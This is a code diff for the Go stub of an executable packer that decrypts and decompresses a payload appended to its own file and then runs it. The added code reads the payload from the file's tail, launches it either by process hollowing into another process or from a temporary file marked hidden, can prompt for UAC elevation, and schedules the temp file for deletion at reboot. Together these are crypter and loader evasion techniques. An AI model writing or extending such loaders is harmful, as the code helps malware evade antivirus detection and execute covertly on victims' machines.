@@ -14,61 +14,136 @@ import (
 	"io"
 	"os"
 	"os/exec"
+	"path/filepath"
 	"syscall"
 	"unsafe"
+	"time"
 	
 	"github.com/ulikunitz/xz"
 	"golang.org/x/crypto/chacha20poly1305"
-)
-
-// Metadata embedded dal packer (sostituiti al build time)
-var (
-	encryptedPayload = []byte{/* PAYLOAD_PLACEHOLDER */}
-	encryptionKey    = []byte{/* KEY_PLACEHOLDER */}
-	encryptionNonce  = []byte{/* NONCE_PLACEHOLDER */}
-	originalSize     = uint64(/* SIZE_PLACEHOLDER */)
-	compressionAlgo  = "/* COMP_ALGO_PLACEHOLDER */"
-	encryptionAlgo   = "/* ENC_ALGO_PLACEHOLDER */"
-	paddingOffsets   = []int{/* PADDING_PLACEHOLDER */}
-	useInMemory      = false // /* INMEMORY_PLACEHOLDER */
 )
 
 // Windows API
 var (
 	kernel32            = syscall.NewLazyDLL("kernel32.dll")
 	ntdll               = syscall.NewLazyDLL("ntdll.dll")
-	procCreateProcess   = kernel32.NewProc("CreateProcessW")
-	procVirtualAllocEx  = kernel32.NewProc("VirtualAllocEx")
-	procWriteProcessMem = kernel32.NewProc("WriteProcessMemory")
-	procReadProcessMem  = kernel32.NewProc("ReadProcessMemory")
-	procGetThreadCtx    = kernel32.NewProc("GetThreadContext")
-	procSetThreadCtx    = kernel32.NewProc("SetThreadContext")
-	procResumeThread    = kernel32.NewProc("ResumeThread")
-	procNtUnmapView     = ntdll.NewProc("NtUnmapViewOfSection")
+	shell32             = syscall.NewLazyDLL("shell32.dll")
+	advapi32            = syscall.NewLazyDLL("advapi32.dll")
+
+	procCreateProcess    = kernel32.NewProc("CreateProcessW")
+	procVirtualAllocEx   = kernel32.NewProc("VirtualAllocEx")
+	procWriteProcessMem  = kernel32.NewProc("WriteProcessMemory")
+	procReadProcessMem   = kernel32.NewProc("ReadProcessMemory")
+	procGetThreadCtx     = kernel32.NewProc("GetThreadContext")
+	procSetThreadCtx     = kernel32.NewProc("SetThreadContext")
+	procResumeThread     = kernel32.NewProc("ResumeThread")
+	procNtUnmapView      = ntdll.NewProc("NtUnmapViewOfSection")
+	procSetFileAttrs     = kernel32.NewProc("SetFileAttributesW")
+	procMoveFileEx       = kernel32.NewProc("MoveFileExW")
+	procGetCurrentProcess = kernel32.NewProc("GetCurrentProcess")
+	procShellExecute     = shell32.NewProc("ShellExecuteW")
+	procOpenProcessToken = advapi32.NewProc("OpenProcessToken")
+	procGetTokenInfo     = advapi32.NewProc("GetTokenInformation")
 )
 
 func main() {
-	// 1. Decifra payload
-	decrypted, err := decrypt(encryptedPayload, encryptionKey, encryptionNonce, encryptionAlgo)
+	// 1. Read metadata and payload from end of file: [payload][metadata][metadata_size:8]
+	exePath, err := os.Executable()
 	if err != nil {
 		os.Exit(1)
 	}
-	
-	// 2. Decomprimi
-	decompressed, err := decompress(decrypted, compressionAlgo)
+	f, err := os.Open(exePath)
 	if err != nil {
 		os.Exit(1)
 	}
-	
-	// 3. Rimuovi padding
-	cleaned := removePadding(decompressed, paddingOffsets)
-	
-	// 4. Esegui
-	if useInMemory {
-		executeProcessHollowing(cleaned)
+	defer f.Close()
+
+	stat, _ := f.Stat()
+	fileSize := stat.Size()
+
+	// Read metadata size (last 8 bytes)
+	f.Seek(fileSize-8, 0)
+	var metadataSize uint64
+	binary.Read(f, binary.LittleEndian, &metadataSize)
+
+	// Read metadata
+	metadataOffset := fileSize - 8 - int64(metadataSize)
+	f.Seek(metadataOffset, 0)
+	metadataBytes := make([]byte, metadataSize)
+	f.Read(metadataBytes)
+	m := parseMetadata(metadataBytes)
+
+	// Read encrypted payload
+	payloadOffset := metadataOffset - int64(m.EncryptedSize)
+	f.Seek(payloadOffset, 0)
+	encryptedPayload := make([]byte, m.EncryptedSize)
+	f.Read(encryptedPayload)
+	f.Close()
+
+	// 2. Decrypt
+	decrypted, err := decrypt(encryptedPayload, m.Key, m.Nonce, m.EncryptionAlgo)
+	if err != nil {
+		os.Exit(1)
+	}
+
+	// 3. Decompress
+	decompressed, err := decompress(decrypted, m.CompressionAlgo)
+	if err != nil {
+		os.Exit(1)
+	}
+
+	// 3.5. Remove any random padding using OriginalSize (if present)
+	payload := trimToOriginal(decompressed, m.OriginalSize)
+
+	// 4. Execute
+	if m.UseInMemory {
+		executeProcessHollowing(payload)
 	} else {
-		executeFromTemp(cleaned)
+		executeFromTemp(payload)
 	}
+}
+
+type Metadata struct {
+	OriginalSize    uint64
+	CompressedSize  uint64
+	EncryptedSize   uint64
+	CompressionAlgo string
+	EncryptionAlgo  string
+	Key             []byte
+	Nonce           []byte
+	UseInMemory     bool
+}
+
+func parseMetadata(data []byte) *Metadata {
+	r := bytes.NewReader(data)
+	m := &Metadata{}
+
+	binary.Read(r, binary.LittleEndian, &m.OriginalSize)
+	binary.Read(r, binary.LittleEndian, &m.CompressedSize)
+	binary.Read(r, binary.LittleEndian, &m.EncryptedSize)
+
+	compAlgo := make([]byte, 16)
+	r.Read(compAlgo)
+	m.CompressionAlgo = string(bytes.TrimRight(compAlgo, "\x00"))
+
+	encAlgo := make([]byte, 16)
+	r.Read(encAlgo)
+	m.EncryptionAlgo = string(bytes.TrimRight(encAlgo, "\x00"))
+
+	var keySize, nonceSize uint32
+	binary.Read(r, binary.LittleEndian, &keySize)
+	if keySize > 0 {
+		m.Key = make([]byte, keySize)
+		r.Read(m.Key)
+	}
+	binary.Read(r, binary.LittleEndian, &nonceSize)
+	if nonceSize > 0 {
+		m.Nonce = make([]byte, nonceSize)
+		r.Read(m.Nonce)
+	}
+	b, _ := r.ReadByte()
+	m.UseInMemory = (b == 1)
+	return m
 }
 
 // decrypt decifra il payload
@@ -136,6 +211,31 @@ func removePadding(data []byte, offsets []int) []byte {
 		return data
 	}
 	// Implementazione semplificata
+	return data
+}
+
+// trimToOriginal slices the decompressed buffer back to the original payload size.
+// When random padding is enabled during packing, padding bytes are added split
+// before and after the original. We can reconstruct the original by taking the
+// middle slice of length originalSize.
+func trimToOriginal(data []byte, originalSize uint64) []byte {
+	if originalSize == 0 {
+		return data
+	}
+	total := uint64(len(data))
+	if total == originalSize {
+		return data
+	}
+	if total > originalSize {
+		extra := total - originalSize
+		front := int(extra / 2)
+		start := front
+		end := start + int(originalSize)
+		if start >= 0 && end <= len(data) && end >= start {
+			return data[start:end]
+		}
+	}
+	// Fallback if sizes are unexpected
 	return data
 }
 
@@ -320,28 +420,174 @@ func executeProcessHollowing(payload []byte) {
 		return
 	}
 	
-	// 12. Resume thread
+ // 12. Resume thread
 	procResumeThread.Call(uintptr(pi.Thread))
 }
 
-// executeFromTemp esegue il payload da file temporaneo
+// executeFromTemp esegue il payload da file temporaneo (preferibilmente nella stessa cartella dell'eseguibile impacchettato)
 func executeFromTemp(payload []byte) {
-	tmp, err := os.CreateTemp("", ".tmp-*.exe")
-	if err != nil {
-		os.Exit(1)
+	// Determina la directory del binario impacchettato
+	exePath, _ := os.Executable()
+	dir := ""
+	if exePath != "" {
+		dir = filepath.Dir(exePath)
+	}
+
+	// Prova a creare l'eseguibile temporaneo nella stessa directory del pacchetto
+	var tmp *os.File
+	var err error
+	if dir != "" {
+		tmp, err = os.CreateTemp(dir, ".~tmp-*.exe")
+	}
+	// Fallback: usa la directory temporanea di sistema
+	if err != nil || tmp == nil {
+		tmp, err = os.CreateTemp("", ".tmp-*.exe")
+		if err != nil {
+			os.Exit(1)
+		}
 	}
 	tmpPath := tmp.Name()
-	
-	tmp.Write(payload)
-	tmp.Close()
-	
+
+	_, _ = tmp.Write(payload)
+	_ = tmp.Close()
+
+	// Nascondi e marca come temporaneo per ridurre visibilità
+	if p := syscall.StringToUTF16Ptr(tmpPath); p != nil {
+		const FILE_ATTRIBUTE_HIDDEN = 0x2
+		const FILE_ATTRIBUTE_TEMPORARY = 0x100
+		_, _, _ = procSetFileAttrs.Call(uintptr(unsafe.Pointer(p)), uintptr(FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_TEMPORARY))
+	}
+
+	// Se il payload richiede privilegi elevati e il processo corrente non è elevato,
+	// usa ShellExecuteW con verbo "runas" per lanciare con UAC
+	if !isProcessElevated() && payloadRequiresAdmin(payload) {
+		params := buildCmdline(os.Args[1:])
+		var dirPtr *uint16
+		if dir != "" {
+			dirPtr = syscall.StringToUTF16Ptr(dir)
+		}
+		r, _, _ := procShellExecute.Call(
+			0,
+			uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("runas"))),
+			uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(tmpPath))),
+			uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(params))),
+			uintptr(unsafe.Pointer(dirPtr)),
+			uintptr(1), // SW_SHOWNORMAL
+		)
+		if r > 32 {
+			// Cleanup non bloccante: il file sarà in uso finché il processo elevato è attivo
+			cleanupTempFile(tmpPath)
+			return
+		}
+		// fallback a esecuzione non elevata se ShellExecute fallisce
+	}
+
 	cmd := exec.Command(tmpPath, os.Args[1:]...)
+	if dir != "" {
+		cmd.Dir = dir
+	}
 	cmd.Stdout = os.Stdout
 	cmd.Stderr = os.Stderr
 	cmd.Stdin = os.Stdin
-	
-	cmd.Run()
-	os.Remove(tmpPath)
+	_ = cmd.Run()
+
+	cleanupTempFile(tmpPath)
+}
+
+// cleanupTempFile rimuove il file temporaneo con retry e, se necessario, pianifica la cancellazione al reboot
+func cleanupTempFile(path string) {
+	deleteWithRetries := func(p string) bool {
+		for i := 0; i < 50; i++ { // ~10s total at 200ms intervals
+			if err := os.Remove(p); err == nil {
+				return true
+			}
+			time.Sleep(200 * time.Millisecond)
+		}
+		return false
+	}
+	if !deleteWithRetries(path) {
+		const MOVEFILE_DELAY_UNTIL_REBOOT = 0x4
+		pOld := syscall.StringToUTF16Ptr(path)
+		_, _, _ = procMoveFileEx.Call(uintptr(unsafe.Pointer(pOld)), uintptr(0), uintptr(MOVEFILE_DELAY_UNTIL_REBOOT))
+	}
+}
+
+// buildCmdline unisce gli argomenti in una stringa semplice (quoting minimale)
+func buildCmdline(args []string) string {
+	if len(args) == 0 {
+		return ""
+	}
+	// Nota: per semplicità non gestiamo escaping complesso
+	// Se servono argomenti con spazi, Windows li accetta con doppi apici
+	var buf bytes.Buffer
+	for i, a := range args {
+		if i > 0 {
+			buf.WriteByte(' ')
+		}
+		needsQuote := false
+		for j := 0; j < len(a); j++ {
+			c := a[j]
+			if c == ' ' || c == '\t' || c == '"' {
+				needsQuote = true
+				break
+			}
+		}
+		if needsQuote {
+			buf.WriteByte('"')
+			for j := 0; j < len(a); j++ {
+				if a[j] == '"' {
+					buf.WriteByte('\\')
+				}
+				buf.WriteByte(a[j])
+			}
+			buf.WriteByte('"')
+		} else {
+			buf.WriteString(a)
+		}
+	}
+	return buf.String()
+}
+
+// payloadRequiresAdmin prova a rilevare dal manifest se è richiesta elevazione UAC
+func payloadRequiresAdmin(payload []byte) bool {
+	// Heuristics: cerca stringhe del manifest comunemente presenti
+	if bytes.Contains(payload, []byte("requireAdministrator")) {
+		return true
+	}
+	// Alcune app usano highestAvailable; in ambienti admin può comunque mostrare UAC
+	if bytes.Contains(payload, []byte("requestedExecutionLevel")) && bytes.Contains(payload, []byte("highestAvailable")) {
+		return true
+	}
+	return false
+}
+
+// isProcessElevated verifica se il processo corrente è già elevato (Admin)
+func isProcessElevated() bool {
+	// OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)
+	const TOKEN_QUERY = 0x0008
+	const TokenElevation = 20
+	var token syscall.Token
+	// Obtain current process handle via Kernel32!GetCurrentProcess to avoid syscall API signature differences
+	ph, _, _ := procGetCurrentProcess.Call()
+	r1, _, _ := procOpenProcessToken.Call(
+		ph,
+		uintptr(TOKEN_QUERY),
+		uintptr(unsafe.Pointer(&token)),
+	)
+	if r1 == 0 {
+		return false
+	}
+	defer token.Close()
+	var elevation uint32
+	var outLen uint32
+	procGetTokenInfo.Call(
+		uintptr(token),
+		uintptr(TokenElevation),
+		uintptr(unsafe.Pointer(&elevation)),
+		uintptr(4),
+		uintptr(unsafe.Pointer(&outLen)),
+	)
+	return elevation != 0
 }
 
 // Helper functions con error checking
